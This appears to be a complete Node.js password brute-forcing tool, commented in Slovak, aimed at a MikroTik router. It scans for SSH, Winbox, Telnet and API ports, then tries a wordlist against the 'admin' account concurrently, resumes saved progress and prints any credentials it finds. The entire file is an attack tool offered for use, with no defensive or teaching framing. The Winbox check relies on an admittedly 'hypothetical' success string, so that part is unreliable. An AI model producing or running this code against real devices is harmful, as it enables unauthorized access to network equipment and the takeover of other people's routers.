const net = require('net');
const { Client } = require('ssh2');
const fs = require('fs').promises;
const readline = require('readline');

// Konfigurácia
const TARGET_IP = '192.168.1.1'; // IP cieľového MikroTiku
const USERNAME = 'admin'; // Predvolené meno
const PASSWORD_FILE = 'passwords.txt'; // Súbor s heslami
const PROGRESS_FILE = 'progress.json'; // Súbor na ukladanie progresu
const MAX_CONCURRENT = 10; // Maximálne súbežné pokusy

// Potenciálne služby MikroTiku a ich predvolené porty
const SERVICES = {
    ssh: { port: 22, name: 'SSH' },
    winbox: { port: 8291, name: 'Winbox' },
    telnet: { port: 23, name: 'Telnet' },
    api: { port: 8728, name: 'API' }, // MikroTik API (nešifrované)
    api_ssl: { port: 8729, name: 'API-SSL' }, // MikroTik API (šifrované)
};

// Globálne premenné
let passwords = new Set();
let triedPasswords = new Set();
let totalPasswords = 0;
let currentIndex = 0;
let foundCredentials = null;
let activeServices = {};

// Detekcia aktívnych služieb
async function detectServices() {
    console.log('Skenujem aktívne služby na', TARGET_IP);

    const promises = Object.entries(SERVICES).map(([key, { port, name }]) =>
        new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(2000);

            socket.on('connect', () => {
                console.log(`${name} (port ${port}) je dostupný`);
                activeServices[key] = { port, name };
                socket.destroy();
                resolve();
            }).on('timeout', () => {
                socket.destroy();
                resolve();
            }).on('error', () => {
                socket.destroy();
                resolve();
            }).connect(port, TARGET_IP);
        })
    );

    await Promise.all(promises);
    if (Object.keys(activeServices).length === 0) {
        throw new Error('Žiadne aktívne služby neboli nájdené. Skončím.');
    }
    console.log('Aktívne služby:', Object.values(activeServices).map(s => s.name));
}

// Načítanie hesiel zo súboru
async function loadPasswords() {
    const fileStream = require('fs').createReadStream(PASSWORD_FILE);
    const rl = readline.createInterface({ input: fileStream });

    for await (const line of rl) {
        const trimmed = line.trim();
        if (trimmed && !passwords.has(trimmed)) {
            passwords.add(trimmed);
        }
    }
    totalPasswords = passwords.size;
    console.log(`Načítaných ${totalPasswords} jedinečných hesiel.`);
}

// Načítanie progresu zo súboru
async function loadProgress() {
    try {
        const data = await fs.readFile(PROGRESS_FILE, 'utf8');
        const progress = JSON.parse(data);
        currentIndex = progress.lastIndex || 0;
        triedPasswords = new Set(progress.triedPasswords || []);
        console.log(`Obnovený progres: ${currentIndex}/${totalPasswords}`);
    } catch (err) {
        console.log('Žiadny predchádzajúci progres, začínam od nuly.');
    }
}

// Uloženie progresu
async function saveProgress() {
    const progress = {
        lastIndex: currentIndex,
        triedPasswords: Array.from(triedPasswords),
    };
    await fs.writeFile(PROGRESS_FILE, JSON.stringify(progress, null, 2));
}

// Funkcie pre pokusy o prihlásenie
function trySSH(password) {
    return new Promise((resolve) => {
        const conn = new Client();
        conn.on('ready', () => {
            foundCredentials = { protocol: 'SSH', username: USERNAME, password };
            conn.end();
            resolve(true);
        }).on('error', () => {
            conn.end();
            resolve(false);
        }).connect({
            host: TARGET_IP,
            port: activeServices.ssh.port,
            username: USERNAME,
            password,
            readyTimeout: 5000,
            keepaliveInterval: 0,
        });
    });
}

function tryWinbox(password) {
    return new Promise((resolve) => {
        const socket = new net.Socket();
        socket.setTimeout(5000);
        socket.on('connect', () => {
            socket.write(`${USERNAME}\n${password}\n`);
        }).on('data', (data) => {
            if (data.toString().includes('success')) { // Hypotetická odpoveď
                foundCredentials = { protocol: 'Winbox', username: USERNAME, password };
                socket.destroy();
                resolve(true);
            } else {
                socket.destroy();
                resolve(false);
            }
        }).on('timeout', () => {
            socket.destroy();
            resolve(false);
        }).on('error', () => {
            socket.destroy();
            resolve(false);
        }).connect(activeServices.winbox.port, TARGET_IP);
    });
}

function tryTelnet(password) {
    return new Promise((resolve) => {
        const socket = new net.Socket();
        socket.setTimeout(5000);
        socket.on('connect', () => {
            socket.write(`${USERNAME}\r\n${password}\r\n`);
        }).on('data', (data) => {
            if (data.toString().includes('>')) { // Telnet prompt
                foundCredentials = { protocol: 'Telnet', username: USERNAME, password };
                socket.destroy();
                resolve(true);
            } else {
                socket.destroy();
                resolve(false);
            }
        }).on('timeout', () => {
            socket.destroy();
            resolve(false);
        }).on('error', () => {
            socket.destroy();
            resolve(false);
        }).connect(activeServices.telnet.port, TARGET_IP);
    });
}

function tryAPI(password) {
    return new Promise((resolve) => {
        const socket = new net.Socket();
        socket.setTimeout(5000);
        socket.on('connect', () => {
            socket.write(`/login\n=name=${USERNAME}\n=password=${password}\n`);
        }).on('data', (data) => {
            if (data.toString().includes('!done')) { // Úspešná odpoveď API
                foundCredentials = { protocol: 'API', username: USERNAME, password };
                socket.destroy();
                resolve(true);
            } else {
                socket.destroy();
                resolve(false);
            }
        }).on('timeout', () => {
            socket.destroy();
            resolve(false);
        }).on('error', () => {
            socket.destroy();
            resolve(false);
        }).connect(activeServices.api.port, TARGET_IP);
    });
}

// Hlavná funkcia na brute-force
async function bruteForce() {
    await loadPasswords();
    await loadProgress();

    const passwordArray = Array.from(passwords);
    if (currentIndex >= totalPasswords) {
        console.log('Všetky heslá boli vyskúšané.');
        return;
    }

    async function processBatch(startIndex) {
        const batchSize = Math.min(MAX_CONCURRENT, totalPasswords - startIndex);
        const promises = [];

        for (let i = 0; i < batchSize; i++) {
            const idx = startIndex + i;
            if (idx >= totalPasswords) break;

            const password = passwordArray[idx];
            if (triedPasswords.has(password)) continue;

            triedPasswords.add(password);
            currentIndex = idx + 1;

            const attempts = [];
            if (activeServices.ssh) attempts.push(trySSH(password));
            if (activeServices.winbox) attempts.push(tryWinbox(password));
            if (activeServices.telnet) attempts.push(tryTelnet(password));
            if (activeServices.api) attempts.push(tryAPI(password));

            promises.push(
                Promise.any(attempts).then((success) => ({ password, success }))
            );
        }

        const results = await Promise.all(promises);
        for (const { password, success } of results) {
            if (success) {
                console.log(`Nájdené správne heslo: ${password}`);
                return true;
            }
        }
        return false;
    }

    while (currentIndex < totalPasswords && !foundCredentials) {
        console.log(`Progres: ${currentIndex}/${totalPasswords} (${((currentIndex / totalPasswords) * 100).toFixed(2)}%)`);
        const success = await processBatch(currentIndex);
        if (success) break;
        await saveProgress();
        await new Promise((r) => setTimeout(r, 1000));
    }

    if (foundCredentials) {
        console.log('Úspešné prihlásenie!');
        console.log(`Protokol: ${foundCredentials.protocol}`);
        console.log(`Meno: ${foundCredentials.username}`);
        console.log(`Heslo: ${foundCredentials.password}`);
        console.log(`Skúsených hesiel: ${currentIndex}/${totalPasswords}`);
    } else {
        console.log('Nenašlo sa správne heslo.');
    }
}

// Spustenie s obnovou pri chybe
async function runWithRetry() {
    await detectServices();
    while (!foundCredentials) {
        try {
            await bruteForce();
            break;
        } catch (err) {
            console.error(`Chyba: ${err.message}. Reštartujem...`);
            await new Promise((r) => setTimeout(r, 5000));
        }
    }
}

runWithRetry();